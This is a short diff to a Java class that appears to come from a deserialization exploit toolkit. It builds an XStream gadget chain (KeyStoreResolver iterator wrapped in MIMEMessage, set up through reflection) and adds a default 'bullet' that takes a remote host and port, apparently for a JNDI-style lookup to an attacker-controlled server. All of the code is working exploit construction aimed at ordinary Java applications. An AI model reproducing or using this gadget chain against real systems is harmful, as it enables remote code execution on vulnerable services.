@@ -32,12 +32,16 @@ public class XMLMessagePacket extends XStreamPayload<Object> {
 
     @Override
     public Bullet getDefaultBullet(Object... args) throws Exception {
-        return null;
+        Bullet bullet = new LazySearchEnumerationImplBullet();
+        bullet.set("rhost", args[0]);
+        bullet.set("rport", args[1]);
+        return bullet;
     }
 
     @Override
     public Object pack(Object obj) throws Exception {
-        Object it = ReflectionHelper.createWithoutConstructor("com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator");
+        Object it = ReflectionHelper
+                .createWithoutConstructor("com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator");
         ReflectionHelper.setFieldValue(it, "aliases", obj);
         MIMEMessage mm = ReflectionHelper.createWithoutConstructor(MIMEMessage.class);
         ReflectionHelper.setFieldValue(mm, "it", it);
